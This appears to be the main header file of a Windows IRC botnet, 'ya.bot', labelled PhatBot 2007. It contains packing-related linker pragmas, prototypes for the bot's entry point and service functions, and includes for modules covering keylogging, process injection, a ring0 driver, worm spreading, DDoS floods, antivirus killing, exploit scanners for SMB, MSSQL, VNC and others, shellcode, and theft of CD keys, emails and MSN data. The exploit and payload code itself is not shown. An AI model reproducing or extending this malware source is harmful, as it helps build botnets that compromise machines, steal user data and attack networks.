/*  ya.bot  */

#pragma optimize("gsy", on)
#pragma comment(linker, "/ENTRY:bot_entrypoint")
#pragma comment(linker, "/FILEALIGN:0x200")
#pragma comment(linker, "/IGNORE:4078")
#pragma comment(linker, "/MERGE:.rdata=.data") 
#pragma comment(linker, "/MERGE:.reloc=.data") 
#pragma comment(linker, "/MERGE:.text=.data")
#pragma comment(linker, "/RELEASE")
#pragma comment(linker, "/SECTION:.text, EWR")
#pragma comment(linker, "/STUB:source\\stub.dat")

#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "mpr.lib")
#pragma comment(lib, "msvcrt.lib")
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ws2_32.lib")

#define _WIN32_WINNT 0x0400
#define _WSPIAPI_COUNTOF
#define WIN32_LEAN_AND_MEAN
#define WIN32_EXTRA_LEAN
#include <windows.h>
#include <lm.h>
#include <lmat.h>
#include <psapi.h>
#include <shellapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <wininet.h>
#include <winnetwk.h>
#include <winsock2.h>
#include <winsvc.h>
#include <ws2tcpip.h>

#include "globals.h"
#include "antidebug.h"
#include "debug.h"
#include "dcc.h"
#include "file.h"
#include "ftp.h"
#include "http.h"
#include "info.h"
#include "inject.h"
#include "keylog.h"
#include "logic.h"
#include "misc.h"
#include "netutils.h"
#include "patch.h"
#include "persist.h"
#include "process.h"
#include "psniff.h"
#include "registry.h"
#include "ring0.h"
#include "secure.h"
#include "service.h"
#include "speedtest.h"
#include "tcpip.h"
#include "thread.h"
#include "userctrl.h"

#include "install\install_bot.h"
#include "install\install_driver.h"
#include "install\install_wormride.h"

#include "protocol\irc.h"
#include "protocol\irc_parser.h"

#include "..\crypto\crypto.h"
#include "..\crypto\rc4.h"
#include "..\crypto\sha256.h"

#include "..\daemon\daemon_ftp.h"
#include "..\daemon\daemon_http.h"
#include "..\daemon\daemon_ident.h"
#include "..\daemon\daemon_socks4.h"

#include "..\ddos\bandwithflood.h"
#include "..\ddos\synackflood.h"
#include "..\ddos\trollflood.h"
#include "..\ddos\udpflood.h"

#include "..\killer\avkiller.h"
#include "..\killer\botkiller.h"

#include "..\scan\expscan.h"
#include "..\scan\expscan_asn1.h"
#include "..\scan\expscan_ftp.h"
#include "..\scan\expscan_myudf.h"
#include "..\scan\expscan_smb.h"
#include "..\scan\expscan_smtp.h"
#include "..\scan\expscan_realvnc.h"
#include "..\scan\mircscan.h"
#include "..\scan\transfer.h"
#include "..\scan\usbscan.h"
#include "..\scan\wordlist.h"

#include "..\scan\new\expscan_radmin.h"
#include "..\scan\new\mssql.h"
#include "..\scan\new\netapi.h"
#include "..\scan\new\sym.h"
#include "..\scan\new\wdns.h"
#include "..\scan\new\vncps\vncps.h"

#include "..\shellcode\shellcode.h"

#include "..\snag\snag_cdkeys.h"
#include "..\snag\snag_clipboard.h"
#include "..\snag\snag_emails.h"
#include "..\snag\snag_msn.h"
#include "..\snag\snag_storage.h"

#include "..\settings\colors.h"
#include "..\settings\defines.h"
#include "..\settings\externs.h"

DWORD WINAPI bot_main(LPVOID param);
void WINAPI bot_servicehandler(DWORD dwCode);
void WINAPI bot_servicemain(DWORD argc, LPTSTR *argv);
void bot_entrypoint();

#define PRODUCT_VERSION "PhatBot 2007 (0.4.2) \"Release\" on \"Win32\""